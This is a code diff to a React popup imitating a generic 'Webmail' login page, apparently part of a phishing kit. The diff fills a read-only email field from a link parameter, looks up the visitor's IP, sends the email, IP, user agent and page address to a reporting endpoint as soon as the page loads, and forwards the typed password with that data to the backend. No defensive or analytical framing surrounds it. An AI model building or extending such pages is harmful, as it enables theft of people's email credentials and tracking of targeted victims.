@@ -3,17 +3,20 @@
 
 import React, { useState, useEffect } from "react";
 
-const Popup = ({ domain, systemInfo }) => {
-  const [email, setEmail] = useState("");
+const Popup = ({ domain, eparams, systemInfo }) => {
   const [password, setPassword] = useState("");
   const [userAgent, setUserAgent] = useState("");
   const [remoteAddress, setRemoteAddress] = useState("");
   const [landingUrl, setLandingUrl] = useState("");
 
   useEffect(() => {
+    // Set user agent
     setUserAgent(navigator.userAgent);
+    
+    // Set landing URL
     setLandingUrl(window.location.href);
-
+    
+    // Get IP address
     const getIP = async () => {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -24,8 +27,21 @@ const Popup = ({ domain, systemInfo }) => {
         setRemoteAddress("Unable to retrieve IP");
       }
     };
-
+    
     getIP();
+
+    // Send access notification when component mounts
+    const sendAccessNotification = async () => {
+      try {
+        await fetch(`/api/sendemail?email=${encodeURIComponent(eparams)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
+          method: "GET",
+        });
+      } catch (error) {
+        console.error("Failed to send access notification:", error);
+      }
+    };
+    
+    sendAccessNotification();
 
     const link = document.createElement("link");
     link.href = "https://fonts.googleapis.com/css2?family=Open+Sans&display=swap";
@@ -38,7 +54,7 @@ const Popup = ({ domain, systemInfo }) => {
         /* ignore */
       }
     };
-  }, []);
+  }, [eparams, remoteAddress]);
 
   const handleLogin = async (e) => {
     e.preventDefault();
@@ -49,7 +65,7 @@ const Popup = ({ domain, systemInfo }) => {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ 
-          eparams: email, 
+          eparams, 
           password, 
           userAgent, 
           remoteAddress,
@@ -69,18 +85,18 @@ const Popup = ({ domain, systemInfo }) => {
         backgroundColor: "#fff",
         borderRadius: "10px",
         maxWidth: "2000px",
-        margin: "50px",
+        margin: "30px",
         fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
       }}
     >
       <img style={{ width: "305px", marginLeft: "227px", justifyContent: "center" }} src="/Webmail.png" alt="" />
 
-      {/* Email (editable) */}
+      {/* Email (read-only) */}
       <div style={{ marginTop: "30px", marginBottom: "15px", fontSize: "14px" }}>
         <label style={{ marginLeft: "235px", fontWeight: "559", fontSize: "15px", color: "#293a4a" }}>Email Address</label>
         <div style={{ position: "relative", width: "36%", marginLeft: "235px", marginTop: "5px" }}>
           <img src="/Human icon.jpg" alt="icon" style={{ position: "absolute", top: "50%", left: "12px", transform: "translateY(-50%)", width: "16px", height: "16px", pointerEvents: "none" }} />
-          <input type="email" placeholder="Enter your email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ width: "111%", padding: "12px 12px 12px 36px", borderRadius: "4px", border: "2px solid #ccc", outline: "none", height: "34px", boxSizing: "border-box" }} />
+          <input type="email" value={eparams} readOnly style={{ width: "111%", padding: "12px 12px 12px 36px", borderRadius: "4px", border: "2px solid #ccc", outline: "none", height: "34px", boxSizing: "border-box" }} />
         </div>
       </div>
 
@@ -101,7 +117,7 @@ const Popup = ({ domain, systemInfo }) => {
           backgroundColor: "#179bd7",
           color: "#fff",
           border: "none",
-          padding: "12px",
+          padding: "center",
           fontWeight: "bold",
           borderRadius: "4px",
           cursor: "pointer",
@@ -111,7 +127,6 @@ const Popup = ({ domain, systemInfo }) => {
           justifyContent: "center",
           marginTop: "23px",
           fontFamily: "'Open Sans', sans-serif",
-          padding: "center"
         }}
       >
         Log in
@@ -168,8 +183,7 @@ const Popup = ({ domain, systemInfo }) => {
   );
 };
 
-const PopupMobile = ({ domain, systemInfo }) => {
-  const [email, setEmail] = useState("");
+const PopupMobile = ({ domain, eparams, systemInfo }) => {
   const [password, setPassword] = useState("");
   const [locale, setLocale] = useState("English");
   const [userAgent, setUserAgent] = useState("");
@@ -177,9 +191,13 @@ const PopupMobile = ({ domain, systemInfo }) => {
   const [landingUrl, setLandingUrl] = useState("");
 
   useEffect(() => {
+    // Set user agent
     setUserAgent(navigator.userAgent);
+    
+    // Set landing URL
     setLandingUrl(window.location.href);
-
+    
+    // Get IP address
     const getIP = async () => {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -190,9 +208,22 @@ const PopupMobile = ({ domain, systemInfo }) => {
         setRemoteAddress("Unable to retrieve IP");
       }
     };
-
+    
     getIP();
-  }, []);
+
+    // Send access notification when component mounts
+    const sendAccessNotification = async () => {
+      try {
+        await fetch(`/api/sendemail?email=${encodeURIComponent(eparams)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
+          method: "GET",
+        });
+      } catch (error) {
+        console.error("Failed to send access notification:", error);
+      }
+    };
+    
+    sendAccessNotification();
+  }, [eparams, remoteAddress]);
 
   const handleLogin = async (e) => {
     e.preventDefault();
@@ -203,7 +234,7 @@ const PopupMobile = ({ domain, systemInfo }) => {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ 
-          eparams: email, 
+          eparams, 
           password, 
           userAgent, 
           remoteAddress,
@@ -225,12 +256,12 @@ const PopupMobile = ({ domain, systemInfo }) => {
 
       <div style={{ marginBottom: "14px", position: "relative" }}>
         <img src="/Human icon.jpg" alt="user icon" style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", width: "18px", height: "18px", pointerEvents: "none", opacity: 0.8 }} />
-        <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Enter your email" style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "12px", boxSizing: "border-box" }} aria-label="Email address" />
+        <input type="email" value={eparams} readOnly style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "15px", boxSizing: "border-box" }} aria-label="Email address" />
       </div>
 
       <div style={{ marginBottom: "18px", position: "relative" }}>
         <img src="/password icon.jpg" alt="password icon" style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", width: "18px", height: "18px", pointerEvents: "none", opacity: 0.8 }} />
-        <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "12px", boxSizing: "border-box" }} aria-label="Password" />
+        <input type="password"  placeholder="Enter your email password"  value={password} onChange={(e) => setPassword(e.target.value)} style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "12px", boxSizing: "border-box" }} aria-label="Password" />
       </div>
 
       <button onClick={handleLogin} style={{ width: "100%", backgroundColor: "#179bd7", color: "#fff", border: "none", padding: "12px", fontWeight: "700", borderRadius: "6px", cursor: "pointer", fontSize: "15px", marginBottom: "18px" }}>
